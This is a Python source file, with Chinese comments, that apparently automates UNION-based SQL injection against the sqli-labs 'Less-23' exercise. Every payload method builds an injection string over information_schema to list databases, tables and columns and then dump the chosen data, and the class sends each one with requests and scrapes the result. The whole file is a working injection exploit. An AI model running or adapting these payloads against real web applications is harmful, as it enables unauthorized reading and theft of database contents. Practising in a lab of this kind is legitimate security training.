import requests
import re

from bs4 import BeautifulSoup


class Less23(object):

    All = {}

    def __init__(self,url,level,dbs,tables,columns,schema,d,t,c):

        if url[-1] == "/":

            self.url = url

        else:

            self.url = url + "/"   # 获取不同的变量名，放入到self 类中 

        self.level = level

        self.dbs = dbs

        self.tables = tables

        self.columns = columns

        self.schema = schema

        self.d = d

        self.t = t

        self.c = c




    def dbs_payload(self):

        self.All[23] = "?id=-1'union select 1,(select group_concat(schema_name) from information_schema.schemata),'3"   # 用来枚举数据[库]的payload

        return self.All[self.level]



    def tables_payload(self):

        self.All[23] = "?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='"+self.d+"'),'3"    # 用来枚举数据库[表]的payload

        return self.All[self.level]



    def columns_payload(self):

        self.All[23] = "?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='"+self.t+"'),'3"   # 用来枚举数据库[列]的payload

        return self.All[self.level]



    def data_payload(self):

        self.All[23] = "?id=-1' union select 1,(select group_concat("+self.c+") from "+self.d+"."+self.t+"),'3" # 用来枚举所有的[数据]

        return self.All[self.level]



    def soup(self):

        soup = BeautifulSoup(self.rep.text,"html5lib")

        strings = soup.find_all('font')[2].text        # 把获取到的文本进行筛选


        return strings.split("Your")[1].split(":")[1].split(",")



    def DBS(self):

        self.rep = requests.get(self.url+self.dbs_payload())  # 调用数据库 payload和筛选出数据库数据

        return self.soup()



    def TABLES(self):

        self.rep = requests.get(self.url+self.tables_payload())  # 调用表的 payload和筛选出表的数据

        return self.soup()



    def COLUMNS(self):
        
        self.rep = requests.get(self.url+self.columns_payload()) # 调用列的 payload和筛选出列的数据

        return self.soup()



    def SCHEMA(self):

        self.rep = requests.get(self.url+self.data_payload()) # 调用获取数据的 payload和筛选出数据

        return self.soup()



    def TYPE(self):

        if self.dbs:  # 如果枚举数据库被设置

            print(self.DBS())

        elif self.d != '' and self.tables: # 如果枚举表和数据库名被设置

            print(self.TABLES())

        elif self.t != '' and self.columns and self.d != '': # 如果枚举列,和数据表,和数据列被设置

            print(self.COLUMNS())

        elif self.c != '' and self.t != '' and self.d != '' and self.schema: # 如果数据表,数据库,数据列被设置

            print(self.SCHEMA())

        else:

            print("wrong options and bad type!")



    def Less_23(self):

        self.TYPE()
